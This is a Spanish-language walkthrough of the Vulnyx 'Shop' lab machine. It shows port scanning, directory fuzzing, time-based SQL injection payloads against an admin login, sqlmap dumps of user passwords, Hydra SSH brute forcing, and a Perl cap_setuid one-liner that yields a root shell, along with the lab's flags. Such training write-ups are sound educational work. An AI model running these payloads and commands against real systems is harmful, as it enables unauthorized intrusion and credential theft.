---
icon: flag
---

# Shop Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 03:23 EDT
Nmap scan report for 192.168.5.74
Host is up (0.0021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ce:24:21:a9:2a:9e:70:2a:50:ae:d3:d4:31🆎01:ba (RSA)
|   256 6b:65:3b:41:b3:63:0b:12:ba:d3:69:ac:14:de:39:7f (ECDSA)
|_  256 04:cb:d9:9b:40:cc:28:58:fc:03:e7:4f:f7:6a:e5:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: VulNyx Shop
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:C3:30:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

Veremos un puerto `80` bastante interesante en el que aloja una pagina web, si entramos dentro de la misma veremos una tienda de ropa para comprar articulos, pero nada fuera de lo normal, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.74/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/css                  (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 3768]
/js                   (Status: 403) [Size: 277]
/fonts                (Status: 403) [Size: 277]
/administrator        (Status: 200) [Size: 589]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos un directorio interesante llamado `administrator` vamos a ver que contiene si entramos.

```
URL = http://<IP>/administrator
```

Veremos un panel de `login` simple, vamos a probar algunas credenciales por defecto, pero veremos que no nos sirve de nada, si probamos alguna `injeccion` de `SQL` super simple para ver algun comportamiento extraño como estos de aqui:

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

No hace nada, pero si probamos este otro `payload`:

```
User: ' OR SLEEP(5)-- -
Pass: ' OR SLEEP(5)-- -
```

Veremos que con esto si funciona y estaria cargando unos `10` segundos, por lo que es vulnerable a un `SQLi`, vamos a utilizar una herramienta que nos automatiza todo esto.

Antes vamos abrir `BurpSuite` para capturar la peticion (`Request`) de la pagina del `login` y utilizarlo con `sqlmap`, una vez que la tengamos tendremos que ver algo asi:

> request.txt

```
POST /administrator/login.php HTTP/1.1
Host: 192.168.5.74
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://192.168.5.74
Connection: keep-alive
Referer: http://192.168.5.74/administrator/
Cookie: PHPSESSID=r1hg757p0fmnnlj3qcs7c38he7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=admin&submit=
```

Ahora vamos a utilizar `sqlmap` de esta forma:

## Escalate user bart

### sqlmap

```shell
sqlmap -r request.txt --dbs --batch
```

Info:

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:35:09 /2025-08-10/

[03:35:09] [INFO] parsing HTTP request from 'request.txt'
[03:35:09] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[03:35:09] [INFO] testing connection to the target URL
[03:35:09] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:35:09] [INFO] testing if the target URL content is stable
[03:35:10] [INFO] target URL content is stable
[03:35:10] [INFO] testing if POST parameter 'username' is dynamic
[03:35:10] [WARNING] POST parameter 'username' does not appear to be dynamic
[03:35:10] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[03:35:10] [INFO] testing for SQL injection on POST parameter 'username'
[03:35:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:35:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:35:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:35:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:35:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:35:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:35:10] [INFO] testing 'Generic inline queries'
[03:35:10] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:35:10] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:35:10] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:35:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:35:20] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:35:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:35:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://192.168.5.74/administrator/profile.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[03:35:20] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[03:35:20] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[03:35:20] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1904 FROM (SELECT(SLEEP(5)))Duox) AND 'rSty'='rSty&password=admin&submit=
---
[03:35:36] [INFO] the back-end DBMS is MySQL
[03:35:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:35:41] [INFO] fetching database names
[03:35:41] [INFO] fetching number of databases
[03:35:41] [INFO] retrieved: 4
[03:35:46] [INFO] retrieved: 
[03:35:51] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[03:36:49] [INFO] retrieved: Webapp
[03:37:10] [INFO] retrieved: mysql
[03:37:26] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp

[03:38:22] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.74'
[03:38:22] [WARNING] your sqlmap version is outdated

[*] ending @ 03:38:22 /2025-08-10/
```

Vemos que ha funcionado, por lo que vamos a ver que contiene la `DDBB` llamada `Webapp` de esta forma.

```shell
sqlmap -r request.txt --dbs --batch -D Webapp --threads 10 --tables
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:39:50 /2025-08-10/

[03:39:50] [INFO] parsing HTTP request from 'request.txt'
[03:39:50] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[03:39:50] [INFO] resuming back-end DBMS 'mysql' 
[03:39:50] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1904 FROM (SELECT(SLEEP(5)))Duox) AND 'rSty'='rSty&password=admin&submit=
---
[03:39:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:39:50] [INFO] fetching database names
[03:39:50] [INFO] fetching number of databases
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[03:39:50] [INFO] resumed: 4
[03:39:50] [INFO] resumed: information_schema
[03:39:50] [INFO] resumed: Webapp
[03:39:50] [INFO] resumed: mysql
[03:39:50] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp

[03:39:50] [INFO] fetching tables for database: 'Webapp'
[03:39:50] [INFO] fetching number of tables for database 'Webapp'
[03:39:50] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                              
[03:39:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[03:39:55] [INFO] retrieved: 
[03:40:05] [INFO] adjusting time delay to 1 second due to good response times
Users
Database: Webapp
[1 table]
+-------+
| Users |
+-------+

[03:40:18] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.74'
[03:40:18] [WARNING] your sqlmap version is outdated

[*] ending @ 03:40:18 /2025-08-10/
```

Veremos una tabla llamada `Users` bastante interesante, por lo que vamos a ver que contiene dentro de la propia tabla directamente con el siguiente comando:

```shell
sqlmap -r request.txt --dbs --batch -D Webapp -T Users --threads 10 --dump
```

Info:

```
Database: Webapp
Table: Users
[4 entries]
+----------+--------------+
| username | password     |
+----------+--------------+
| bart     | b4rtp0w4     |
| liam     | liam@nd3rs0n |
| mike     | mikeblabla   |
| peter    | peter123!    |
+----------+--------------+
```

Veremos que hemos sacados las credenciales de dichos usuarios, por lo que vamos a crearnos un listado de usuarios y contraseñas para probarlas directamente en `SSH` a ver si hay suerte.

> users.txt

```
bart
liam
mike
peter
```

> pass.txt

```
b4rtp0w4
liam@nd3rs0n
mikeblabla
peter123!
```

### Hydra

```shell
hydra -L users.txt -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-10 03:56:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://192.168.5.74:22/
[22][ssh] host: 192.168.5.74   login: bart   password: b4rtp0w4
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-10 03:56:57
```

### SSH

```shell
ssh bart@<IP>
```

Metemos como contraseña `b4rtp0w4` y veremos que estaremos dentro.

Info:

```
bart@shop:~$ whoami
bart
```

Ahora leeremos la `flag` del usuario.

> user.txt

```
598a05f84190e327bc4796335d948144
```

## Escalate Privileges

Ahora si listamos las `capabilities` de dicho usuario del sistema veremos lo siguiente:

```shell
/sbin/getcap -r / 2>/dev/null
```

Info:

```
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

Veremos cosas ineteresantes como que por ejemplo tenemos esos privilegios especiales en el binario `perl` por lo que podremos aprovechar eso poniendo dicho comando:

```shell
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Info:

```
root@shop:~# whoami
root
```

Con esto veremos que seremos `root` ya directamente, por lo que vamos a leer la `flag` de `root`.

> root.txt

```
1c4cddb6c20e0e756163b2a9714a1260
```
